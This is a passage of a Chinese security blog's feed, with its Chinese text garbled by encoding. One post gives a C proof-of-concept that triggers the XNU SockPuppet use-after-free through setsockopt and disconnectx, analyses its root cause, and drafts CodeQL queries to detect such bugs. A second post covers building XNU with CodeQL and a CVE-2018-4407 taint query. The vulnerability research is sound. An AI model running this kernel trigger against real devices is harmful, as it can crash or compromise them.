class="meta-string">&lt;UIKit/UIKit.h&gt;</span></span></span><br><span class="line"><span class="meta">#import <span class="meta-string">"AppDelegate.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IPV6_USE_MIN_MTU 42</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">int</span> s = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"res0: %d\n"</span>, s);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Permit setsockopt after disconnecting (and freeing socket options)</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">so_np_extensions</span> <span class="title">sonpx</span> = &#123;</span>.npx_flags = SONPX_SETOPTSHUT, .npx_mask = SONPX_SETOPTSHUT&#125;;</span><br><span class="line">    <span class="keyword">int</span> res = setsockopt(s, SOL_SOCKET, SO_NP_EXTENSIONS, &amp;sonpx, <span class="keyword">sizeof</span>(sonpx));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"res1: %d\n"</span>, res);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> minmtu = <span class="number">-1</span>;</span><br><span class="line">    res = setsockopt(s, IPPROTO_IPV6, IPV6_USE_MIN_MTU, &amp;minmtu, <span class="keyword">sizeof</span>(minmtu));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"res2: %d\n"</span>, res);</span><br><span class="line">    </span><br><span class="line">    res = disconnectx(s, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"res3: %d\n"</span>, res);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// set, write sth...</span></span><br><span class="line">    res = setsockopt(s, IPPROTO_IPV6, IPV6_USE_MIN_MTU, &amp;minmtu, <span class="keyword">sizeof</span>(minmtu));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"res4: %d\n"</span>, res);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">close</span>(s);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"done\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    @autoreleasepool &#123;</span><br><span class="line">        <span class="keyword">return</span> UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="bug-analysis"><a href="#bug-analysis" class="headerlink" title="bug analysis"></a>bug analysis</h1><p>æ ¹æ®æ¼æ´æè¿°ï¼Œå¯ä»¥çœ‹åˆ°æ¼æ´çš„ root causeå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">in6_pcbdetach(struct inpcb *inp)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">if</span> (!(so-&gt;so_flags &amp; SOF_PCBCLEARING)) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ip_moptions</span> *<span class="title">imo</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ip6_moptions</span> *<span class="title">im6o</span>;</span></span><br><span class="line"></span><br><span class="line">        inp-&gt;inp_vflag = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (inp-&gt;in6p_options != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            m_freem(inp-&gt;in6p_options);</span><br><span class="line">            inp-&gt;in6p_options = <span class="literal">NULL</span>; <span class="comment">// &lt;- good</span></span><br><span class="line">        &#125;</span><br><span class="line">        ip6_freepcbopts(inp-&gt;in6p_outputopts); <span class="comment">// &lt;- bad</span></span><br><span class="line">        ROUTE_RELEASE(&amp;inp-&gt;in6p_route);</span><br><span class="line">        <span class="comment">// free IPv4 related resources in case of mapped addr</span></span><br><span class="line">        <span class="keyword">if</span> (inp-&gt;inp_options != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            (<span class="keyword">void</span>) m_free(inp-&gt;inp_options); <span class="comment">// &lt;- good</span></span><br><span class="line">            inp-&gt;inp_options = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>æ¼æ´è·¯å¾„ <code>bsd/netinet6/in6_pcb.c</code> ï¼Œåè®®æ— <code>AF_INET6</code> çš„å¤„ç†å‡½æ•°ï¼Œä»å‡½æ•°åå­—æ¥çœ‹æ˜¯<br>æ–­å¼€è¿æ¥æ—¶å€™ä¼šæ‰§è¡Œçš„ä¸€äº›æ“ä½œï¼ˆé‡Šæ”¾ä¸€äº›èµ„æºï¼‰ï¼Œä½†æ˜¯é‡Šæ”¾ä¹‹åå¿˜è®°æŠŠæŒ‡é’ˆç½®NULLï¼Œå¯¼è‡´åŒä¸€ä¸ªå¥—æ¥å­—é‡è¿çš„æ—¶å€™åˆä½¿ç”¨åˆ°äº†è¿™ä¸ªæŒ‡é’ˆï¼ˆæ‚¬å‚æŒ‡é’ˆï¼‰ã€‚<br>æ ¹æ®<code>nedwill</code>çš„æè¿°ï¼Œè¿æ¥æ–­å¼€å†<code>set/get socketopt</code>çš„åœºæ™¯å¯ä»¥è§¦å‘ã€‚</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/Untitled%202.png" alt="Issue%201806%20XNU%20Use-after-free%20due%20to%20stale%20pointer%20a2555a06c23846e09d40b51e696047aa/Untitled%202.png"></p><p>è¿›å…¥å‡½æ•°ä¹‹å‰æœ‰ä¸€ä¸ª socket <code>so_flags</code> çš„æ£€æŸ¥ï¼Œpocä¸­çš„ <code>setsockopt()</code> è°ƒç”¨åº”è¯¥æ˜¯ä¸ºäº†èƒ½è¿‡è¿›å…¥æ¼æ´é€»è¾‘è®¾è®¡çš„ã€‚</p><p>åˆ©ç”¨ <code>socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);</code> è¿™ä¸ªpocï¼Œé€»è¾‘åº”è¯¥æ˜¯ï¼š</p><ul><li>åˆ›å»ºsocketè¿æ¥</li><li>setsockoptï¼Œä¸ºäº†åç»­å¯ä»¥è¿›å…¥æ¼æ´ä»£ç åˆ†æ”¯ï¼ŒåŒæ—¶è®¾ç½®è¦è¯»çš„æ•°æ®</li><li>disconnectx æ–­å¼€è¿æ¥ï¼Œè§¦å‘ free é€»è¾‘</li><li>getsockoptï¼Œè¯»å–å·²ç»é‡Šæ”¾çš„å†…å­˜</li></ul><p>å†™çš„é€»è¾‘ç±»ä¼¼ï¼Œä¸è¿‡ä½œè€…æ˜¯æ‰¾åˆ°äº†å¦å¤–ç‰¹æ®Šçš„æˆå‘˜æ¥å®Œæˆå†™æ“ä½œï¼š <code>SONPX_SETOPTSHUT</code>  </p><p>è¿™ä¸ªæ´çš„å“ç›¸å¤ªå¥½äº†  :-)</p><h1 id="how-to-find-by-QL"><a href="#how-to-find-by-QL" class="headerlink" title="how to find by QL"></a>how to find by QL</h1><h2 id="xnu-database"><a href="#xnu-database" class="headerlink" title="xnu database"></a>xnu database</h2><p>å¯ä»¥ä»semmleå®˜æ–¹ç½‘ç«™ä¸‹è½½</p><p><a href="https://semmle.com/large-oss-projects">Analyzing large open source projects</a></p><h2 id="about-this-bug"><a href="#about-this-bug" class="headerlink" title="about this bug"></a>about this bug</h2><p>çœ‹èµ·æ¥æ˜¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">demo</span><span class="params">(p)</span></span>&#123;</span><br><span class="line">  </span><br><span class="line">  ptr, p2; <span class="comment">// ....</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    ptr = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    m_free(p-&gt;p1); <span class="comment">// vuln!</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(xxx)&#123;</span><br><span class="line">        freem(p2);</span><br><span class="line">        p2 = <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‡Šæ”¾äº†å†…å­˜ä¹‹åï¼Œæ²¡æœ‰å¯¹æŒ‡é’ˆåšç½®NULLå¤„ç†ã€‚</p><ul><li>éœ€è¦åœ¨åŒä¸€ä¸ªå‡½æ•°é‡Œï¼ŒåŒä¸€ä¸ªä»£ç å—é‡Œã€‚ <strong><del>é”çš„é—®é¢˜è€ƒè™‘å—ï¼Ÿ</del></strong></li><li>é‡Šæ”¾é€»è¾‘ï¼Œæ­£åˆ™åŒ¹é…ä¸‹ï¼Œ xxxfree, freexxx, releasexxxä¹‹ç±»çš„</li></ul><h2 id="query-1"><a href="#query-1" class="headerlink" title="query 1"></a>query 1</h2><p>æ ¹æ®ä¸Šé¢çš„æè¿°ï¼Œæˆ‘ä»¬æ‰¾åˆ°free è°ƒç”¨ï¼Œä¸”freeè°ƒç”¨ä¸‹ä¸€è¡Œæ˜¯ç‰¹å®šçš„èµ‹å€¼è¡¨è¾¾å¼çš„æƒ…å†µï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cpp</span><br><span class="line"></span><br><span class="line">from FunctionCall call, AssignExpr e</span><br><span class="line">where call.getTarget().getName().regexpMatch(<span class="string">".*free.*?"</span>) <span class="keyword">and</span></span><br><span class="line">    call.getEnclosingBlock() = e.getEnclosingBlock() <span class="keyword">and</span></span><br><span class="line">    e.getRValue().(Literal).getValue() = <span class="string">"0"</span> <span class="keyword">and</span></span><br><span class="line">    call.getLocation().getStartLine() + <span class="number">1</span> =  e.getLocation().getStartLine()</span><br><span class="line">select call, call.getEnclosingFunction().getName(), call.getArgument(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/Untitled%203.png" alt="Issue%201806%20XNU%20Use-after-free%20due%20to%20stale%20pointer%20a2555a06c23846e09d40b51e696047aa/Untitled%203.png"></p><p>è¿™é‡Œæœ‰ä¸€ä¸ªé—®é¢˜ï¼Œæˆ‘å°è¯•è¿‡<code> freeè°ƒç”¨çš„å‚æ•°ä½œä¸ºèµ‹å€¼è¡¨è¾¾å¼çš„å·¦å€¼</code> è¿™æ¡çº¦æŸï¼Œä½†æ˜¯åŠ ä¸Šä¹‹åå°±æ‰¾ä¸åˆ°ä»»ä½•ç»“æœäº†ï¼Œå¦‚æœæœ‰äººçŸ¥é“åŸå› è¿˜è¯·æŒ‡ç‚¹ä¸€ä¸‹ : )</p><h2 id="query-2"><a href="#query-2" class="headerlink" title="query 2"></a>query 2</h2><p>ä¸Šé¢queryå¯ä»¥æ‰¾åˆ° freeåæ˜¯set NULLçš„ä»£ç æ®µï¼Œå¦‚æœæƒ³æ‰¾ä¸æ»¡è¶³æ¡ä»¶çš„ï¼Œå¯ä»¥æ£€æµ‹freeé€»è¾‘ä¸‹ä¸€è¡Œæ˜¯ä¸æ˜¯ instance of AssignExprï¼Œå½“ç„¶è¿™æ ·æ¯”è¾ƒç²—ç³™ï¼Œä¼šå­˜åœ¨è¯¯æŠ¥ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from FunctionCall call, Expr e</span><br><span class="line">where call.getTarget().getName().regexpMatch(<span class="string">".*free.*?"</span>) <span class="keyword">and</span></span><br><span class="line">    call.getEnclosingBlock() = e.getEnclosingBlock() <span class="keyword">and</span></span><br><span class="line">    <span class="keyword">not</span>(e instanceof AssignExpr ) <span class="keyword">and</span></span><br><span class="line">    call.getLocation().getStartLine() + <span class="number">1</span> =  e.getLocation().getStartLine()</span><br><span class="line">select call, call.getEnclosingFunction().getName(), call.getArgument(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>è¿™æ ·å†™ï¼Œè™½ç„¶å¯ä»¥æ‰¾åˆ°ç›®æ ‡ä»£ç ï¼Œä½†æ˜¯å­˜åœ¨è¯¯æŠ¥ï¼ˆä¼˜åŒ–TODOï¼‰ï¼š</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/Untitled%204.png" alt="Issue%201806%20XNU%20Use-after-free%20due%20to%20stale%20pointer%20a2555a06c23846e09d40b51e696047aa/Untitled%204.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Basic&quot;&gt;&lt;a href=&quot;#Basic&quot; class=&quot;headerlink&quot; title=&quot;Basic&quot;&gt;&lt;/a&gt;Basic&lt;/h1&gt;&lt;p&gt;  è¿™ä¸ªæ¼æ´æ˜¯ç”±pj0çš„ &lt;code&gt;nedwill&lt;/code&gt; å‘ç°çš„ï¼Œè€Œä¸”æ˜¯ä¸€ä¸ªå“ç›¸æä½³çš„å¯ä»¥ç”¨äºè¶Šç‹±çš„æ¼æ´ï¼Œæœ¬æ–‡åªæ˜¯å¯¹æ¼æ´è¿›è¡Œåˆ†æï¼Œå¹¶ä¸”æ€è€ƒ/å°è¯•ä½¿ç”¨CodeQLå¯¹è¯¥ç±»å‹æ¼æ´è¦†ç›–ã€‚å½“ç„¶ï¼Œåœ¨çœ‹äº†åŸä½œè€…çš„&lt;a href=&quot;https://googleprojectzero.blogspot.com/2019/12/sockpuppet-walkthrough-of-kernel.html&quot;&gt;æ–‡ç« &lt;/a&gt;ä¹‹åï¼Œæ‰å‘ç°nedwillæ˜¯åˆ©ç”¨Fuzzingçš„æ‰‹æ®µå‘ç°çš„è¿™ä¸ªæ¼æ´ï¼Œå¹¶ä¸”åœ¨æŒ–æ˜è¯»/å†™åŸè¯­çš„æ—¶å€™ä¹Ÿæ˜¯å€ŸåŠ©äº†Fuzzingçš„æ‰‹æ®µï¼Œå¯ä»¥è¯´ååˆ†çš„å·§å¦™å’Œé«˜æ•ˆäº†ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="æ¼æ´åˆ†æ" scheme="http://o0xmuhe.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="æ¼æ´åˆ†æ" scheme="http://o0xmuhe.me/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    <category term="macOS" scheme="http://o0xmuhe.me/tags/macOS/"/>
    
    <category term="XNU" scheme="http://o0xmuhe.me/tags/XNU/"/>
    
    <category term="CodeQL" scheme="http://o0xmuhe.me/tags/CodeQL/"/>
    
    <category term="iOS" scheme="http://o0xmuhe.me/tags/iOS/"/>
    
  </entry>
  
  <entry>
    <title>CodeQL + XNU From 0 to 1</title>
    <link href="http://o0xmuhe.me/2021/02/15/CodeQL-XNU-From-0-to-1/"/>
    <id>http://o0xmuhe.me/2021/02/15/CodeQL-XNU-From-0-to-1/</id>
    <published>2021-02-15T09:04:33.000Z</published>
    <updated>2021-06-09T14:34:03.533Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h2><p><strong>æœ¬æ–‡å±äºå­¦ä¹ è¿‡ç¨‹ä¸­çš„ç¬”è®°ï¼ŒåŸºæœ¬ä¸Šæ˜¯æŠŠç°æœ‰çš„ç›¸å…³èµ„æ–™æ•´åˆåˆ°ä¸€èµ·ï¼Œé˜…è¯»å·²æœ‰åšå®¢/æ–‡ç« å¹¶å¤ç°ï¼ŒåŠ å…¥ä¸€äº›è‡ªå·±çš„æƒ³æ³•åè®°å½•ä¸‹æ¥çš„äº§ç‰©ã€‚</strong></p><p>build XNU è¿‡ç¨‹æ¥è‡ªæŸå¤§ä½¬çš„åšå®¢ï¼Œ<code>build xnu with codeql</code>è¿‡ç¨‹æ¥è‡ª<code>github</code></p><a id="more"></a><hr><p><strong>UPDATE</strong> </p><p>2021.3.7 æ›´æ–°ï¼Œæˆ‘åœ¨big surä¸Šbuild <code>xnu-7195.81.3</code> ä¹Ÿæ˜¯é‡åˆ°äº†pythonæƒé™çš„é—®é¢˜ï¼Œä½¿ç”¨virtualenvçš„æ–¹å¼è§£å†³äº†ã€‚</p><hr><ul><li>å¦‚æœæ˜¯è€ç‰ˆæœ¬ï¼Œå»ºè®®å…ˆæœä¸€ä¸‹æœ‰æ²¡æœ‰ç°æˆçš„databaseå¯ä»¥ç”¨ã€‚</li><li>å¦‚æœæ‰¾ä¸åˆ°ï¼Œå¯¹äºç‰ˆæœ¬è·¨åº¦æ¯”è¾ƒå¤§çš„æƒ…å†µï¼Œè¿˜æ˜¯è™šæ‹Ÿæœº+è€ç‰ˆæœ¬Xcodeæ¯”è¾ƒç¨³ã€‚</li></ul><p><a href="https://kernelshaman.blogspot.com/2021/01/building-xnu-for-macos-big-sur-1101.html">Building XNU for macOS Big Sur 11.0.1 (Intel)</a></p><p><a href="https://github.com/D4rkD0g/boringforever/blob/main/xnu/boringanalysis/codeql_xnu.md">D4rkD0g/boringforever</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl https://jeremya.com/sw/Makefile.xnudeps &gt; Makefile.xnudeps</span><br><span class="line">make -f Makefile.xnudeps</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">XNU is now ready to build!</span><br><span class="line"></span><br><span class="line">To build the kernel <span class="keyword">for</span> supported x86_64 machines:</span><br><span class="line"><span class="built_in">cd</span> xnu-7195.81.3</span><br><span class="line">make SDKROOT=macosx TARGET_CONFIGS=<span class="string">"RELEASE X86_64 NONE"</span></span><br><span class="line"></span><br><span class="line">To build <span class="keyword">for</span> supported arm64e machines you can, e.g.:</span><br><span class="line"><span class="built_in">cd</span> xnu-7195.81.3</span><br><span class="line">make SDKROOT=macosx KDKROOT=/path/to/KDK TARGET_CONFIGS=<span class="string">"RELEASE ARM64 T8101"</span></span><br><span class="line"></span><br><span class="line">For a table of supported arm64 products, visit:</span><br><span class="line">https://kernelshaman.blogspot.com/2021/02/building-xnu-for-macos-112-intel-apple.html<span class="comment">#xnu-arm64e</span></span><br><span class="line"></span><br><span class="line">See xnu<span class="string">'s top-level README file for additional build and configuration variables</span></span><br><span class="line"><span class="string">which can be passed on the command line, e.g.,</span></span><br><span class="line"><span class="string">  Speed up the build with: BUILD_LTO=0</span></span><br><span class="line"><span class="string">  Build the development kernel with: KERNEL_CONFIGS=DEVELOPMENT</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Use LOGCOLORS=y to colorize the output</span></span><br><span class="line"><span class="string">Use CONCISE=y to keep all the build output on a single line</span></span><br><span class="line"><span class="string">--------------------------------------------------------------------------------</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> xnu-7195.81.3</span><br><span class="line">// æ­£å¸¸ç¼–è¯‘xnuçš„å‘½ä»¤</span><br><span class="line">make SDKROOT=macosx TARGET_CONFIGS=<span class="string">"RELEASE X86_64 NONE"</span></span><br><span class="line">// ä½¿ç”¨codeqlç¼–è¯‘å‘½ä»¤</span><br><span class="line">codeql database create xnu-database --language=cpp --<span class="built_in">command</span>=<span class="string">"make SDKROOT=macosx ARCH_CONFIGS=X86_64 KERNEL_CONFIGS=RELEASE"</span></span><br></pre></td></tr></table></figure><p>å‰©ä¸‹çš„å°±æ˜¯ç­‰äº†:</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/Untitled.png" alt="CodeQL%20+%20XNU%20c4461858b1454816bc8aa7d2f87a674b/Untitled.png"></p><p>éšåå¯ä»¥å¯¼å…¥æ•°æ®åº“åˆ°vscodeä¸­ä½¿ç”¨ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨codecli</p><ul><li>é‡åˆ°çš„é—®é¢˜1 ï¼š <code>env: python : Permisson denied</code></li></ul><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/Untitled%201.png" alt="CodeQL%20+%20XNU%20c4461858b1454816bc8aa7d2f87a674b/Untitled%201.png"></p><p>è§£å†³ï¼šå¯ä»¥å°è¯•æ›´æ¢xcodeç‰ˆæœ¬æ¥å°è¯•ï¼Œæˆ‘ä¹Ÿè¯•è¿‡ä½¿ç”¨rootæˆ–è€…ä½¿ç”¨python virtualenvæ¥è§„é¿é—®é¢˜ï¼Œä½†æ˜¯è¿˜æ˜¯ä¸è¡Œã€‚</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/Untitled%202.png" alt="CodeQL%20+%20XNU%20c4461858b1454816bc8aa7d2f87a674b/Untitled%202.png"></p><p>Queryæµ‹è¯•</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/Untitled%203.png" alt="CodeQL%20+%20XNU%20c4461858b1454816bc8aa7d2f87a674b/Untitled%203.png"></p><h2 id="Case-study"><a href="#Case-study" class="headerlink" title="Case study"></a>Case study</h2><h3 id="CVE-2018-4407-ping-ping-ping"><a href="#CVE-2018-4407-ping-ping-ping" class="headerlink" title="CVE-2018-4407 - ping ping ping"></a>CVE-2018-4407 - ping ping ping</h3><h4 id="Setup-env"><a href="#Setup-env" class="headerlink" title="Setup env"></a>Setup env</h4><p><a href="https://securitylab.github.com/research/apple-xnu-icmp-error-CVE-2018-4407">Kernel crash caused by out-of-bounds write in Appleâ€™s ICMP packet-handling code (CVE-2018-4407) - GitHub Security Lab</a></p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/Untitled%204.png" alt="CodeQL%20+%20XNU%20c4461858b1454816bc8aa7d2f87a674b/Untitled%204.png"></p><p>ä»¥10.13.6ä¸ºä¾‹</p><p>éœ€è¦ä½ç‰ˆæœ¬çš„xcodeæ¥ç¼–è¯‘ï¼Œç›´æ¥å» <a href="https://developer.apple.com/download/more/"><code>https://developer.apple.com/download/more/</code></a> ä¸‹è½½å³å¯ã€‚</p><p>æ„å»º <code>codeql database</code> :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// è€ç‰ˆæœ¬ xcode</span><br><span class="line"></span><br><span class="line">make -f Makefile.xnudeps macos_version=10.13.6  xnudeps</span><br></pre></td></tr></table></figure><h4 id="find-by-codeql"><a href="#find-by-codeql" class="headerlink" title="find by codeql"></a>find by codeql</h4><p>å¯¼å…¥ <code>xnu 10.13.6</code> çš„databaseåï¼Œå…ˆçœ‹åŸä½œè€…çš„queryï¼Œå°è¯•ç†è§£ä»–çš„æ€è·¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @name mbuf copydata with tainted size</span></span><br><span class="line"><span class="comment"> * @description Calling m_copydata with an untrusted size argument</span></span><br><span class="line"><span class="comment"> *              could cause a buffer overflow.</span></span><br><span class="line"><span class="comment"> * @kind path-problem</span></span><br><span class="line"><span class="comment"> * @problem.severity warning</span></span><br><span class="line"><span class="comment"> * @id apple-xnu/cpp/mbuf-copydata-with-tainted-size</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cpp</span><br><span class="line"><span class="keyword">import</span> semmle.code.cpp.dataflow.TaintTracking</span><br><span class="line"><span class="keyword">import</span> DataFlow::PathGraph</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span> <span class="title">extends</span> <span class="title">TaintTracking</span>:</span>:Configuration &#123;</span><br><span class="line">  Config() &#123; <span class="keyword">this</span> = <span class="string">"tcphdr_flow"</span> &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">override</span> predicate isSource(DataFlow::Node source) &#123;</span><br><span class="line">    source.asExpr().(FunctionCall).getTarget().getName() = <span class="string">"m_mtod"</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">override</span> predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">    <span class="built_in">exists</span> (FunctionCall call</span><br><span class="line">    | call.getArgument(<span class="number">2</span>) = sink.asExpr() <span class="keyword">and</span></span><br><span class="line">      call.getTarget().getName().matches(<span class="string">"%copydata"</span>))</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from Config cfg, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line">where cfg.hasFlowPath(source, sink)</span><br><span class="line">select sink, source, sink, <span class="string">"m_copydata with tainted size."</span></span><br></pre></td></tr></table></figure><p>åŸä½œè€…ä½¿ç”¨äº†æ±¡ç‚¹åˆ†ææ¥è¿½è¸ªm_mtodè°ƒç”¨åˆ° copydata é•¿åº¦å‚æ•°ã€‚</p><p>è¯´ä¸‹å…·ä½“çš„source sinkçš„æè¿°æŠŠï¼š</p><p>source ï¼š æ•°æ®æµèµ·ç‚¹ï¼Œæ˜¯ä¸€ä¸ª å‡½æ•°è°ƒç”¨(functioncall)ï¼Œå¹¶ä¸”è¯¥å‡½æ•°æ˜¯ <code>m_mtod</code></p><p>sink : â€œç»ˆç‚¹â€ï¼ˆå¯ä»¥è¿™ä¹ˆç†è§£å§ï¼‰ï¼Œæ˜¯ <code>copydata</code> å‡½æ•°çš„ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œå‡½æ•°ååŒ¹é…ä½¿ç”¨äº†æ­£åˆ™ï¼Œèƒ½åŒ¹é…åˆ° <code>copydata</code> ç³»åˆ—ã€‚</p><p>ç»“æœå¦‚ä¸‹ï¼š</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/Untitled%205.png" alt="CodeQL%20+%20XNU%20c4461858b1454816bc8aa7d2f87a674b/Untitled%205.png"></p><p>æˆ‘è®¤ä¸ºéš¾ç‚¹å¹¶ä¸æ˜¯å¦‚ä½•å†™æ±¡ç‚¹åˆ†æçš„queryï¼Œéš¾ç‚¹åº”è¯¥æ˜¯ åˆ†æå°±ç»“æœç„¶å<strong>æ„é€ poc</strong></p><h4 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h4><p>ä»è¡¨è±¡æ¥çœ‹æ¼æ´å‡ºåœ¨ <code>m_copydata(n, 0, icmplen, (caddr_t)&amp;icp-&gt;icmp_ip);</code></p><p><a href="https://sourcegraph.com/github.com/apple/darwin-xnu@0a798f6738bc1db01281fc08ae024145e84df927/-/blob/bsd/netinet/ip_icmp.c#L339">ip_icmp.c - apple/darwin-xnu - 